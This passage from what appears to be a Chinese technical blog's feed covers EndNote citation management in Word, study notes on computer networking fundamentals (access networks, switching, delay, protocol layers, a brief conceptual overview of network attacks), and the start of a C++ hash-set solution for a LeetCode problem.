Text</code>，即可下载PDF全文。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532837.png"alt="image-20240328151736870" /><figcaption aria-hidden="true">image-20240328151736870</figcaption></figure><h1 id="引用文献">3. 引用文献</h1><h2 id="插入文献">3.1 插入文献</h2><p>安装EndNote后，MSOffice工具栏中会自动生成EndNote选项卡，可将EndNote与MSWord连接起来，从而快速插入参考文献。</p><p><strong>方式一</strong>：鼠标光标放在Word中需要插入文献的位置，在EndNote中选择文献，点击<code>Insert Citation</code>，即可在Word中插入文献。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532838.png"alt="image-20240328152352008" /><figcaption aria-hidden="true">image-20240328152352008</figcaption></figure><p><strong>方式二</strong>：鼠标光标放在Word中需要插入文献的位置，在Word中EndNote选项卡里，选择<code>Insert Citation</code>，查找EndNote中的文献信息。查找完成，选中文献，点击<code>Insert</code>即可。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532839.png"alt="image-20240328152622122" /><figcaption aria-hidden="true">image-20240328152622122</figcaption></figure><h2 id="批量修改文献格式">3.2 批量修改文献格式</h2><ol type="1"><li>EndNote中内置了大量引文格式可供选择，在OfficeWord中选择<code>Style</code>，可点击<code>Select another style</code>看更多引文格式。选择所需引文格式，则所有文献格式会一键式更新。</li><li>如果在内置的引文格式无法满足需求，则可到<ahref="http://endnote.com/downloads/styles">EndNote官网</a>搜索并下载所需文献格式。下载完成，双击该文件即可在EndNote中打开，点击<code>File--Save as</code>保存该引文格式。重新打开Word，即可通过<code>Style--Select another style</code>找到该文献格式并使用。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532840.png"alt="image-20240328152815032" /><figcaption aria-hidden="true">image-20240328152815032</figcaption></figure><h2 id="消除域代码">3.3 消除域代码</h2><p>通过EndNote向Word插入参考文献，是通过域代码格式连接的，因此方可批量修改文献格式。如文档全部编辑完成，为避免出错，需要消除域代码，将原文档转换为纯文本文档。选择<code>Convert Citations and Bibliography</code>--<code>Conver to Plain Text</code>，点击确定，转换完成，即可进行下一步投稿工作。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532841.png"alt="image-20240328152940525" /><figcaption aria-hidden="true">image-20240328152940525</figcaption></figure><p><strong>参考资料：</strong></p><ol type="1"><li>南方科技大学图书馆：https://sustech.libguides.com/c.php?g=929626&amp;p=6717027</li></ol>]]></content>
    
    
    <categories>
      
      <category>论文写作</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络和因特网</title>
    <link href="/2024/03/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/"/>
    <url>/2024/03/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是因特网">1. 什么是因特网</h1><h2 id="基本组成描述">1.1 基本组成描述</h2><ul><li><strong>数百万联网计算设备</strong>：hosts（主机）= endsystems（终端系统）<ul><li>运行网络应用程序</li></ul></li><li><strong>communication links（通信链路）</strong><ul><li>同轴电缆、铜线、光纤、无线电频谱</li><li>transmission rate（传输速率） = bandwidth（带宽）</li><li>bits/second</li></ul></li><li><strong>packet switches（分组交换机）</strong><ul><li><strong>routers（路由器）</strong> and <strong>link-layerswitches（链路层交换机）</strong></li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528971.png"alt="image-20240327100834022" /><figcaption aria-hidden="true">image-20240327100834022</figcaption></figure><h3 id="端系统">1.1.1 端系统</h3><p>端系统通过<strong>通信链路</strong>和<strong>分组交换机</strong>连接到一起。</p><h3 id="通信链路">1.1.2 通信链路</h3><ul><li>类型：由不同类型的物理媒介和无线频谱组成</li><li>速率：不同的链路以不同的速率传输数据<ul><li>bits/second(bps)</li><li>其他度量单位：Kbps、Mbps、Gbps</li></ul></li></ul><h3 id="分组交换机">1.1.3 分组交换机</h3><ul><li>分组交换机从它的一条入通信链路上接收到达的分组，并从它的一条出通信链路上<strong>转发</strong>该分组<ul><li>在当今的因特网中，<strong>路由器</strong>和<strong>链路层交换机</strong>是两种最主要的类型</li><li>链路层交换机通常用于接入网（access network）</li><li>路由器通常用于网络核心（network core）</li></ul></li><li><strong>route（路由）/path（路径）</strong>：一个<strong>分组（packet）</strong>从发送方到接收方所经历的一系列通信链路和分组交换机</li></ul><h3 id="协议">1.1.4 协议</h3><ul><li><strong>协议（protocols）</strong>控制信息的接收和发送：<strong>TCP(TransmissionControl Protocol, 传输控制协议)</strong>，<strong>IP(InternetProtocol,互联网协议/网际协议)</strong>， HTTP，Skype，Ethernet(以太网),4/5G, streaming video</li><li>因特网标准<ul><li>IETF: Internet Engineering Task Force （因特网工程任务组）</li><li>RFC: Request for comments</li></ul></li></ul><h2 id="服务描述">1.2 服务描述</h2><ul><li>通信基础设施（communicationinfrastructure）可实现分布式应用：Web、VoIP(Voice over Internet Phone),email, games, e-commerce, file sharing, social network</li><li>向应用程序提供的<strong>通信服务</strong><ul><li>connection-oriented reliable service (面向连接可靠服务):从源到目的地的可靠数据传输，称为<strong>传输控制协议(TransmissionControl Protocol,TCP)</strong></li><li>connectionless unreliable service (无连接不可靠服务): "尽最大努力"(不可靠）数据传输，称为<strong>用户数据报协议(User DatagramProtocol,UDP)</strong></li></ul></li><li>向应用程序提供的<strong>应用程序接口（API）</strong><ul><li>因特网API是一套发送程序必须遵循的规则</li><li>允许发送和接收应用程序 "连接 "因特网的钩子</li></ul></li></ul><h2 id="internet-vs-intranet">1.3 Internet vs Intranet</h2><ul><li><p>Internet：网络的网络（网络<code>net</code>是把计算机连接在一起，其中的计算机是网络的节点；互联网<code>internet</code>是把网络连接在一起，即网络的网络，其中的网络是互联网的节点；因特网<code>Internet</code>是全球范围的互联网，主要采用TCP/IP协议）</p><ul><li>松散分层</li><li>公开</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528972.gif"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure></li><li><p>Intranet：私有网络</p><ul><li>本地、私有</li><li>更安全、速度更快</li><li>受到监管</li></ul></li></ul><h2 id="什么是协议">1.4 什么是协议</h2><p>协议规定了网络实体间发送和接收信息的格式、顺序，以及在信息传输和接收时采取的操作。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528974.png"alt="image-20240327110235786" /><figcaption aria-hidden="true">image-20240327110235786</figcaption></figure><h1 id="网络边缘">2. 网络边缘</h1><ul><li><p>主机：客户端和服务器</p></li><li><p>CS（Client-Server）是<strong>客户端-服务器</strong>的网络连接模式，客户端向服务器请求服务并接收响应。服务器充当服务提供者的角色，负责处理客户端的请求并返回相应的数据。CS网络通常用于网站、邮件服务器、云计算等场景。</p></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191105211.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ul><li>P2P（Peer-to-Peer）是<strong>点对点</strong>的网络连接模式，每个节点（peer）都可以直接和其他节点通信，形成一个去中心化的网络结构。在P2P网络中，每个节点可以充当服务提供者和服务消费者的角色。P2P网络通常用于文件共享、视频聊天、在线游戏等场景。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191105212.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ul><li>P2P与CS的最大区别在于<strong>网络结构的中心化程度</strong>。P2P网络没有中央服务器，节点之间相互连接，每个节点可以充当服务提供者和服务消费者的角色，从而使整个网络更加去中心化，具有更高的可扩展性和抗攻击性。而CS网络则需要一台或多台服务器来提供服务，因此具有更高的稳定性和可控性，但也更容易成为攻击的目标。总的来说，P2P网络适用于小规模、去中心化的应用场景，而CS网络则适用于大规模、需要集中管理的应用场景。</li></ul><h2 id="接入网">2.1 接入网</h2><ul><li>residential access networks（住宅接入网络）</li><li>institutional access networks（机构接入网络）</li><li>mobile access networks（移动接入网络）</li></ul><h3 id="住宅接入网络">2.1.1 住宅接入网络</h3><ul><li><p>digital subscriber line(DSL，数字用户线路)</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528975.png"alt="image-20240327111409931" /><figcaption aria-hidden="true">image-20240327111409931</figcaption></figure><ul><li>DSL Modem (DSL 调制解调器):将数字信号调制到模拟载波信号上进行传输，并解调收到的模拟信号以得到数字信息的电子设备</li><li>Splitter（分离器）：分离到达家中的数据和电话信号，并将数据信号转发到DSL调制解调器（formCO to Home）</li><li>DSLAM (digital subscriber line accessmultiplexer，数字用户线路接入复用器）<ul><li>来自许多房屋的模拟信号在 DSLAM 被转换成数字格式</li><li>分离数据和电话信号，并将数据发送到互联网上（from Home to CO）</li></ul></li><li>单一 DSL 链路出现三个独立链路</li><li>电话和互联网连接可同时共享DSL链路。如何实现？使用现有电话线连接到中心局办公室DSLAM ：数据通过 DSL 电话线进入互联网；语音通过 DSL电话线传输到电话网。</li><li>DSL分类：<ul><li>ADSL：非对称数字用户线</li><li>HDSL：高速率数字用户线</li><li>VDSL：超高速数字用户线</li></ul></li></ul></li><li><p>cable network access(有线电视电缆网络接入)</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528976.png"alt="image-20240327112357941" /><figcaption aria-hidden="true">image-20240327112357941</figcaption></figure><ul><li><p>DSL使用现有的电话基础设施，有线互联网接入使用现有有线电视基础设施</p></li><li><p>frequency divisionmultiplexing（频分多路复用）：在不同频段下传输的不同频道</p></li><li><p>HFC: hybrid fiber coax（混合光纤同轴电缆）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528977.png"alt="image-20240327113021536" /><figcaption aria-hidden="true">image-20240327113021536</figcaption></figure><ul><li>非对称</li></ul></li><li><p>电缆、光纤网络将家庭与 ISP 路由器连接起来</p><ul><li>家庭共享电缆头端接入网络</li><li>与 DSL 不同（有专用接入中心局）</li></ul></li></ul></li><li><p>fiber to the home(光纤入户，FTTH)</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528978.png"alt="image-20240327113204513" /><figcaption aria-hidden="true">image-20240327113204513</figcaption></figure><ul><li>光分布式网络架构<ul><li>active optical networks (AONs,有源光网络)</li><li>passive optical networks (PONs,无源光网络）</li></ul></li><li>每个家庭都有ONT（光猫），用户将家庭路由器连接到 ONT访问互联网（国内大多是路由器和光猫的一体机）</li><li>OLT提供光信号和电信号的转换</li><li>分路器（Splitter）将多个家庭（通常小于 100个）合并到一根共享光纤上（from home to OLT）</li></ul></li></ul><h3 id="机构接入网络">2.1.2 机构接入网络</h3><ul><li>通常用于公司、学校</li><li>终端系统通常连接以太网交换机</li></ul><h3 id="移动接入网络">2.1.3 移动接入网络</h3><ul><li><p>共享无线接入网络将终端系统与路由器连接起来</p></li><li><p>wireless LANs（无线局域网）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528979.png"alt="image-20240327114039505" /><figcaption aria-hidden="true">image-20240327114039505</figcaption></figure></li><li><p>wide-area wireless access（广域无线接入网）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528980.png"alt="image-20240327114048245" /><figcaption aria-hidden="true">image-20240327114048245</figcaption></figure></li></ul><h3 id="数据中心网络">2.1.4 数据中心网络</h3><ul><li>高带宽链路（10 到 100 Gbps ）：连接数百至数千台服务器和互联网</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528981.png"alt="image-20240327114247651" /><figcaption aria-hidden="true">image-20240327114247651</figcaption></figure><h2 id="物理媒介">2.2 物理媒介</h2><ul><li>guided（导引型）media：<ul><li>twisted-pair copper wire (双绞铜线)</li><li>coaxial cable (同轴电缆)</li><li>multimode fiber-optic (多模光纤)</li></ul></li><li>unguided（非导引型）media：<ul><li>terrestrial radio spectrum (地面无线频谱)</li><li>satellite radio spectrum (卫星无线频谱)</li></ul></li></ul><h3 id="双绞铜线">2.2.1 双绞铜线</h3><ul><li>两根绝缘铜线：电线缠绕在一起，以减少电气干扰</li><li>常用于网线，少用于电话线</li><li>数据传输速率取决于线的粗细以及传输方和接收方之间的距离</li><li>分类：<ul><li>UTP: Unshielded Twisted Pair (非屏蔽双绞线）</li><li>STP: Shielded Twisted-Pair(屏蔽双绞线)，在芯线外增加铝箔层减少信号衰减</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528982.png"alt="image-20240327115053988" /><figcaption aria-hidden="true">image-20240327115053988</figcaption></figure><h3 id="同轴电缆">2.2.2 同轴电缆</h3><ul><li>两根同心铜导线</li><li>双向，数十 Mbps 传输速率</li><li>宽频<ul><li>有线多频道</li><li>用于有线电视网络，HFC</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528983.png"alt="image-20240327115327010" /><figcaption aria-hidden="true">image-20240327115327010</figcaption></figure><h3 id="光纤电缆">2.2.3 光纤电缆</h3><ul><li>玻璃光纤脉冲，每个脉冲一个比特</li><li>高传输速率</li><li>低错误率</li></ul><h3 id="无线电">2.2.4 无线电</h3><ul><li>没有物理线路</li><li>双向</li><li>传播环境影响：反射、障碍物、干扰</li><li>terrestrial radio channels (地面无线电信道）<ul><li>短距离，有限速率（如蓝牙）</li><li>小范围（如WiFi）</li><li>大范围（如蜂窝网络）</li></ul></li><li>satellite radio channels (卫星无线电信道)<ul><li>数百 Mbps 的速度，但约 280 毫秒的终端延迟</li><li>通常用于无法使用 DSL 或有线互联网接入场景</li><li>地球同步卫星和低地球轨道卫星</li></ul></li></ul><h1 id="网络核心">3. 网络核心</h1><ul><li>网络核心：由<strong>相互连接的路由器</strong>和<strong>连接路由器的链路</strong>组成的网状结构</li><li>移动数据的两种基本方式<ul><li><strong>packetswitching（包交换)</strong>：资源不被预留，按需使用</li><li><strong>circuitswitching（电路交换)</strong>：预留终端系统之间通信路径所需的资源</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528984.png"alt="image-20240327120435125" /><figcaption aria-hidden="true">image-20240327120435125</figcaption></figure><h2 id="分组交换">3.1 分组交换</h2><ul><li>主机将应用层数据划分为<strong>packets（分组/数据包）</strong></li><li>在源和目的地之间，每个分组通过<strong>通信链路</strong>和<strong>分组交换机</strong>传送</li><li>分组以等于该链路<strong>最大传输速率</strong>的速度传输通过通信链路</li><li>传输时延=<spanclass="math inline">\(\frac{L(bits)}{R(bits/sec)}\)</span></li></ul><h3 id="存储转发">3.1.1 存储转发</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528985.png"alt="image-20240327121703135" /><figcaption aria-hidden="true">image-20240327121703135</figcaption></figure><ul><li>多数分组交换机在链路的输入端使用存储转发机制</li><li><strong>存储转发（store andforword）</strong>：整个分组必须到达路由器后才能在下一个链路上传输</li><li>一般情况：一个数据包（L比特），通过由 N条链路组成的路径，每条链路的速率为 R（N-1个路由器）。端到端延迟（忽略传播延迟）为：<span class="math inline">\(N*\frac{L}{R}\)</span></li></ul><h3 id="排队时延和分组丢失">3.1.2 排队时延和分组丢失</h3><ul><li>每个分组交换机有多条链路与之相连</li><li>对于每条相连的链路，该分组交换机具有一个<strong>输出缓存（outputbuffer)</strong>（也称为<strong>输出队列 outputqueue</strong>)，它用于存储路由器准备发往那条链路的分组</li><li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在该输出缓存中<strong>等待</strong></li><li><strong>排队时延：</strong>可变，取决于网络的拥塞程度</li><li>因为缓存空间的大小是<strong>有限</strong>的，一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。在此情况下，将出现<strong>分组丢失（丢包）（packetlost)</strong>，到达的分组或已经排队的分组之一将被丢弃</li></ul><h3 id="转发表和路由选择协议">3.1.3 转发表和路由选择协议</h3><ul><li><strong>路由</strong>：确定分组的源路由和目的路由</li><li><strong>转发</strong>：将数据包从路由器的输入端转移到相应的路由器输出端</li><li><strong>转发表</strong>：将目的地址或目的地址一部分映射成为输出链路</li></ul><h2 id="电路交换">3.2 电路交换</h2><ul><li><p>在端系统间通信会话时，<strong>预留</strong>了端系统间沿路径通信所需的资源（缓存、链路传输速率）</p></li><li><p>常用于传统电话网络</p></li><li><p>在发送信息之前，网络之间<strong>必须</strong>建立连接：这种连接称为<strong>电路（circuit）</strong></p></li><li><p>网络在建立电路的同时，也会在网络链路中保留一个恒定的传输速率，将数据以保证的恒定速率传输</p></li><li><p>专用资源：<strong>不共享</strong></p></li><li><p><strong>FDM (frequency-divisionmultiplexing,频分多路复用）</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528986.png"alt="image-20240327143247603" /><figcaption aria-hidden="true">image-20240327143247603</figcaption></figure><ul><li>链路在连接期间为每个连接提供一个频段</li><li>频带宽度叫做<strong>带宽（bandwidth）</strong></li><li>每条电路<strong>持续</strong>地得到<strong>部分带宽</strong></li></ul></li><li><p><strong>TDM(time-division multiplexing,时分多路复用)</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528987.png"alt="image-20240327143554157" /><figcaption aria-hidden="true">image-20240327143554157</figcaption></figure><ul><li>时间被分为固定时间的<strong>帧（frames）</strong>，每个帧被分为固定数量的<strong>时间片（timeslots）</strong></li><li>网络在每一帧中为该连接分配一个时隙，即（在每一帧中）有一个时隙可用于传输该连接的数据</li><li>每条电路在时间片内<strong>周期性</strong>地获得<strong>所有带宽</strong></li></ul></li></ul><h2 id="分组交换-vs-电路交换">3.3 分组交换 vs 电路交换</h2><ul><li>分组交换不适合实时服务，因为它的端到端时延是可变的和不可预测的</li><li>分组交换比电路交换提供更好的带宽共享，更简单，更有效，实现成本更低</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528988.png"alt="image-20240327142622505" /><figcaption aria-hidden="true">image-20240327142622505</figcaption></figure><h2 id="网络的网络">3.4 网络的网络</h2><ul><li>端系统经过ISP与因特网相连<ul><li>不必是电信或有线电视公司</li><li>可以是住宅、公司和大学</li></ul></li><li>接入ISP必须互相连接</li><li>IXP：Internet Exchange Point，因特网交换点</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528989.png"alt="image-20240327144654028" /><figcaption aria-hidden="true">image-20240327144654028</figcaption></figure><h1 id="分组交换网中的时延丢包和吞吐量">4.分组交换网中的时延、丢包和吞吐量</h1><h2 id="时延">4.1 时延</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528990.png"alt="image-20240327145133444" /><figcaption aria-hidden="true">image-20240327145133444</figcaption></figure><h3 id="节点处理时延">4.1.1 节点处理时延</h3><p>主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据、进行差错检验或查找适当的路由等。</p><h3 id="排队时延">4.1.2 排队时延</h3><p>分组在输出链路等待传输的时间，取决于网络当前的拥塞程度。</p><h3 id="传输时延">4.1.3 传输时延</h3><p>将数据包的所有比特传输（推送）到链路所需的时间。</p><p><span class="math display">\[d_{trans}=\frac{L}{R}\]</span></p><h3 id="传播时延">4.1.4 传播时延</h3><p>从链路起点传播到下一个路由器所需的时间。 <spanclass="math display">\[d_{prop}=\frac{d}{s}\]</span></p><h2 id="排队时延和丢包">4.2 排队时延和丢包</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528991.png"alt="image-20240327150036368" /><figcaption aria-hidden="true">image-20240327150036368</figcaption></figure><ul><li>R：传输速率（bps）</li><li>L：分组大小（bits）</li><li>a：分组到达队列的平均速率（pkt/s）</li><li>流量强度=<span class="math inline">\(\frac{La}{R}\)</span></li><li>一个链路前的<strong>队列（缓冲区）</strong>容量<strong>有限</strong>，到达满队列的数据包将被<strong>丢弃</strong></li></ul><h2 id="端到端时延">4.3 端到端时延</h2><ul><li>假设网络无拥塞，因此排队时延可忽略不计</li><li><spanclass="math inline">\(d_{end-to-end}=N(d_{proc}+d_{trans}+d_{prop})\)</span></li><li>traceroute程序：提供从源头到路由器的延迟测量，沿终端互联网路径到达目的地</li></ul><h2 id="吞吐量">4.4 吞吐量</h2><ul><li><strong>吞吐量（Throughput）</strong>：发送器/接收器之间传输比特的速率<ul><li>瞬时吞吐量</li><li>平均吞吐量</li></ul></li><li>bottleneck link：终端路径上的链路限制终端吞吐量</li></ul><h1 id="协议层次及其服务模型">5. 协议层次及其服务模型</h1><h2 id="因特网五层协议栈">5.1 因特网五层协议栈</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528992.png"alt="image-20240327151344911" /><figcaption aria-hidden="true">image-20240327151344911</figcaption></figure><ul><li><strong>应用层（application）</strong>：支持网络应用<ul><li>FTP、SMTP、HTTP、DNS</li><li>总是在终端系统中通过软件实现</li><li>这种分组在应用层作为<strong>message（消息/报文）</strong></li></ul></li><li><strong>传输层(transport)</strong>：为<strong>进程</strong>提供通用数据传输服务<ul><li>TCP, UDP</li><li>与应用层相同</li><li>传输层数据包称为<strong>segment（报文段）</strong></li></ul></li><li><strong>网络层(network)</strong>：为<strong>主机</strong>提供数据传输服务<ul><li>IP、路由协议</li><li>通常是硬件和软件的混合实现</li><li>网络层数据包称为<strong>datagrams（数据报）</strong></li></ul></li><li><strong>链路层(link)</strong> ：相邻网元之间的数据传输<ul><li>通常在网络接口中实现</li><li>如以太网、802.11(Wi-Fi)、PPP(点对点协议)</li><li>链路层数据包称为<strong>frames（帧）</strong></li></ul></li><li><strong>物理层(physical)</strong> ：bits "on the wire<ul><li>通常在网络接口中实现</li></ul></li></ul><h2 id="osi参考模型7层">5.2 OSI参考模型——7层</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528993.png"alt="image-20240327152213695" /><figcaption aria-hidden="true">image-20240327152213695</figcaption></figure><ul><li><strong>表示层</strong>：允许应用程序解释数据的含义，如加密、压缩、特定机器的约定等。</li><li><strong>会话层</strong> ：建立及管理会话。</li></ul><h2 id="封装">5.3 封装</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403271528994.png"alt="image-20240327152304876" /><figcaption aria-hidden="true">image-20240327152304876</figcaption></figure><h1 id="面对攻击的网络">6. 面对攻击的网络</h1><ul><li>恶意软件(malware)可通过以下方式进入主机：<ul><li>virus(病毒)：通过接收/执行对象（如电子邮件附件）进行自我复制感染</li><li>worm(蠕虫)：通过被动接收对象进行自我复制感染，这些对象本身会被执行（如系统漏洞）</li></ul></li><li>间谍类恶意软件可记录按键（键盘敲击）、访问的网站，并将信息上传至收集网站</li><li>受感染的主机可加入僵尸网络，用于发送垃圾邮件，DDoS 攻击</li><li>sniffing嗅探：<ul><li>广播媒体（共享以太网、无线）</li><li>混杂（promiscuous）网络接口读取/记录经过的所有数据包（如密码）</li></ul></li><li>IP spoofing(IP欺骗)：发送虚假源地址的数据包</li></ul><h1 id="参考资料"><strong>参考资料</strong></h1><ol type="1"><li>计算机网络——自顶向下方法（第七版）</li><li><ahref="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E6%A6%82%E8%BF%B0.md">计算机网络- 概述</a></li><li><ahref="https://zhuanlan.zhihu.com/p/57726649">互连网和互联网</a></li><li><ahref="https://juejin.cn/s/p2p%E5%92%8Ccs%E7%9A%84%E5%8C%BA%E5%88%AB">p2p和cs的区别</a></li><li><ahref="https://zhuanlan.zhihu.com/p/44316491">计算机网络系列--什么是电路交换和分组交换？</a></li><li><ahref="https://juejin.cn/post/7198111440615456829">计网基础</a></li><li><ahref="https://www.zhihu.com/question/21767726">因特网、互联网和以太网三者的区别是什么？</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>计算机网络</category>
      
      <category>计算机网络——自顶向下方法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>哈希表篇</title>
    <link href="/2024/03/26/LeetCode/%E5%93%88%E5%B8%8C%E8%A1%A8%E7%AF%87/"/>
    <url>/2024/03/26/LeetCode/%E5%93%88%E5%B8%8C%E8%A1%A8%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="哈希表的查找插入及删除">1. 哈希表的查找、插入及删除</h1><h2 id="设计哈希集合">设计哈希集合</h2><blockquote><p>实现了一个基于链表的哈希集合数据结构，并提供了添加、删除、查询和释放内存的功能。</p><p>哈希函数：能够将集合中任意可能的元素映射到一个固定范围的整数值，并将该元素存储到整数值对应的地址上。冲突处理：由于不同元素可能映射到相同的整数值，因此需要在整数值出现「冲突」时，需要进行冲突处理。链地址法：为每个哈希值维护一个链表，并将具有相同哈希值的元素都放入这一链表当中。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHashSet</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    vector&lt;list&lt;<span class="hljs-type">int</span>&gt;&gt; data;<br>    <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">int</span> base = <span class="hljs-number">769</span>;<br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> key % base;<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">MyHashSet</span>(): <span class="hljs-built_in">data</span>(base) &#123;&#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> h = <span class="hljs-built_in">hash</span>(key);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = data[h].<span class="hljs-built_in">begin</span>(); it != data[h].<span class="hljs-built_in">end</span>(); it++) &#123;<br>            <span class="hljs-keyword">if</span> ((*it) == key) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        data[h].<span class="hljs-built_in">push_back</span>(key);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> h = <span class="hljs-built_in">hash</span>(key);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = data[h].<span class="hljs-built_in">begin</span>(); it != data[h].<span class="hljs-built_in">end</span>(); it++) &#123;<br>            <span class="hljs-keyword">if</span> ((*it) == key) &#123;<br>                data[h].<span class="hljs-built_in">erase</span>(it);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">contains</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> h = <span class="hljs-built_in">hash</span>(key);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = data[h].<span class="hljs-built_in">begin</span>(); it != data[h].<span class="hljs-built_in">end</span>(); it++) &#123;<br>            <span class="hljs-keyword">if</span> ((*it) == key) &#123;<br>                <span class="hljs-keyword">return</span> <span 